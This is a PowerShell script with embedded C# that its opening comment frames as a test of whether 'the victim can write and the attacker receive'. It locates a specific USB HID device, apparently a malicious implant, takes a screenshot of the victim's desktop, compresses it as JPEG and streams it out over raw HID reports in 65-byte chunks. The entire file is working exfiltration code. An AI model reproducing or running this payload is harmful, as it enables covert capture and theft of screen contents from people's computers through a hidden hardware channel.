#-A simple test to see if the victim can write and the attacker receive

# Open file handle to device
$cs =@"
using System;
using System.IO;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
namespace foo {
	public class bar {
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);

		public static FileStream open(string fn) {
			return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 9, true);
		}
	}
}
"@
Add-Type -TypeDefinition $cs
#Find device
$devs = gwmi Win32_USBControllerDevice
foreach ($dev in $devs) {
	$wmidev = [wmi]$dev.Dependent
	if ($wmidev.GetPropertyValue('DeviceID') -match ('03EB&PID_2066') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
		$devicestring = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
	}
}
$filehandle = [foo.bar]::open($devicestring)

#Create screenshot
[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
$screen = (Get-WmiObject -Class Win32_DesktopMonitor | Select-Object ScreenWidth,ScreenHeight)
$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $screen.ScreenWidth, $screen.ScreenHeight)
$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
$graphics = [Drawing.Graphics]::FromImage($bmp)
$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
$qualityEncoder = [System.Drawing.Imaging.Encoder]::Quality
$encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
$encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter($qualityEncoder, 10)
$jpegCodecInfo = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | where {$_.MimeType -eq 'image/jpeg'}
$pic = New-Object System.IO.MemoryStream
$out = New-Object System.IO.MemoryStream
$bmp.Save($pic,$jpegCodecInfo,$encoderParams)

#Compress
#$tmp = New-Object Byte[] ($pic.Length)
#$pic.Seek(0, [System.IO.SeekOrigin]::Begin)
#$pic.Read($tmp,0,$pic.Length)
#$gzipStream = New-Object System.IO.Compression.GzipStream ($out,([System.IO.Compression.CompressionMode]::Compress) )
#$gzipStream = New-Object System.IO.Compression.GzipStream ($out,([System.IO.Compression.CompressionLevel]::Optimal) )
#$gzipStream.Write($tmp, 0, $tmp.Length)

#Write it
$pic.Seek(0, [System.IO.SeekOrigin]::Begin)
$picbytes = New-Object Byte[] (65)
$inbytes = New-Object Byte[] (65)
$nullbytes = New-Object Byte[] (65)

$picbytes[1] = 63
while ($pic.Position -lt $pic.Length) {
  $null = $filehandle.Write($nullbytes, 0, 65)
	$null = $filehandle.Read($inbytes, 0, 65)
	if ($inbytes[1] -band 128) {
		Write-Output .
	} else {
		$null = $pic.Read($picbytes, 2, 63)
		$null = $filehandle.Write($picbytes, 0, 65)
	}
	$pic.Position
#	sleep -m 32
}
#$gzipStream.Close()
$filehandle.Close()
